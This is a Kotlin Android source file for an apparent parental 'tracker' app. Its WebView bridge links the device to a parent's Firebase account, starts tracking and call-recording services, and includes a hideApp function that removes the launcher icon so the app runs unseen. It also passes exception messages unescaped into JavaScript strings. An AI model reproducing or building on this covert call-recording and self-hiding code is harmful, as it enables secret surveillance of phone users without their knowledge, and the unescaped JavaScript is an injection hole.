package com.abuzahra.tracker

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.provider.Settings
import android.util.Log
import android.webkit.JavascriptInterface
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.FirebaseFirestoreException
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.tasks.await
import com.abuzahra.tracker.services.MainTrackerService
import com.abuzahra.tracker.services.CallRecorderService
import com.abuzahra.tracker.services.DataSyncWorker

class ChildWebInterface(private val mContext: Context) {
    private val auth = FirebaseAuth.getInstance()
    private val db = FirebaseFirestore.getInstance()

    @JavascriptInterface
    fun linkDevice(code: String) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val doc = db.collection("linking_codes").document(code).get().await()
                if (!doc.exists()) { sendResult("window.onLinkError('الكود غير صحيح.')"); return@launch }

                val parentUid = doc.getString("parent_uid")
                if (parentUid.isNullOrEmpty()) { sendResult("window.onLinkError('خطأ في البيانات.')"); return@launch }

                if (auth.currentUser == null) {
                    try { auth.signInAnonymously().await() } catch (e: Exception) {
                        sendResult("window.onLinkError('فشل المصادقة.')"); return@launch
                    }
                }

                val deviceId = Settings.Secure.getString(mContext.contentResolver, Settings.Secure.ANDROID_ID)
                val data = mapOf("device_id" to deviceId, "last_seen" to System.currentTimeMillis(), "app_name" to "Child Device")

                try {
                    db.collection("parents").document(parentUid).collection("children").document(deviceId).set(data).await()
                } catch (e: FirebaseFirestoreException) {
                    sendResult("window.onLinkError('اضغط PUBLISH في قواعد Firebase.')"); return@launch
                }

                db.collection("linking_codes").document(code).delete().await()
                SharedPrefsManager.saveData(mContext, parentUid, deviceId)
                startAllServices()
                sendResult("window.onLinkSuccess()")
            } catch (e: Exception) { sendResult("window.onLinkError('خطأ: ${e.message}')") }
        }
    }

    @JavascriptInterface
    fun startServices() { startAllServices() }

    @JavascriptInterface
    fun hideApp() {
        Log.d("ChildApp", "Hide App Button Clicked")
        
        try {
            val pkg = mContext.packageManager
            // بناء اسم الـ Alias ديناميكياً
            val aliasName = ComponentName(mContext, mContext.packageName + ".LauncherAlias")
            
            Log.d("ChildApp", "Attempting to disable: " + aliasName.flattenToString())

            // 1. إخفاء الأيقونة
            pkg.setComponentEnabledSetting(
                aliasName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            
            // 2. إرسال رسالة نجاح للواجهة
            sendResult("window.onAppHidden()")
            
            // 3. إغلاق التطبيق فوراً ليختفي من الشاشة
            (mContext as MainActivity).finish()
            
        } catch (e: Exception) {
            Log.e("ChildApp", "Failed to hide app", e)
            // إرسال رسالة خطأ للواجهة لنرى السبب
            sendResult("window.onAppError('${e.message}')")
        }
    }

    private fun startAllServices() {
        val intent = Intent(mContext, MainTrackerService::class.java)
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) mContext.startForegroundService(intent) else mContext.startService(intent)
        
        val recIntent = Intent(mContext, CallRecorderService::class.java)
        recIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) mContext.startForegroundService(recIntent) else mContext.startService(recIntent)
        
        DataSyncWorker.startImmediate(mContext)
    }

    private fun sendResult(js: String) { 
        CoroutineScope(Dispatchers.Main).launch { (mContext as MainActivity).webView.evaluateJavascript(js, null) } 
    }
}
